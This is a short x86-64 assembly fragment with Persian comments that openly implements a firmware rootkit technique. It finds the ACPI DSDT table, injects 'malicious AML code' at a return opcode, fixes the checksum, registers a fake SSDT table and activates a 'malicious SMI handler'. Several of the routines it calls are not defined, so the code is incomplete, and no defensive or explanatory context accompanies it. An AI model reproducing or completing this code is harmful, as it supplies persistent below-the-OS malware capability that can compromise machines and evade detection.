section .text
global hook_acpi_tables

hook_acpi_tables:
    ; یافتن جدول DSDT
    call find_dsdt_table
    mov [dsdt_addr], rax
    
    ; تزریق کد AML مخرب
    mov rdi, rax
    mov rsi, malicious_aml_code
    mov rdx, aml_code_size
    call inject_aml_code
    
    ; ایجاد جدول SSDT جعلی
    call create_fake_ssdt
    
    ; ثبت جدول جدید
    mov rdi, rax
    mov rsi, fake_ssdt_size
    call register_ssdt_table
    
    ; فعال‌سازی SMI Handler مخرب
    call activate_malicious_smi
    ret

inject_aml_code:
    ; جستجوی محل تزریق
    mov rcx, [rdi + DSDT_LENGTH]
    sub rcx, 16
    
.search_loop:
    mov rax, [rdi + rcx]
    cmp rax, AML_RETURN_OP
    je .found_location
    dec rcx
    jnz .search_loop
    
.found_location:
    ; تزریق کد AML
    add rdi, rcx
    mov rsi, malicious_aml_code
    mov rcx, aml_code_size
    rep movsb
    
    ; به‌روزرسانی چک‌سام
    call update_dsdt_checksum
    ret
    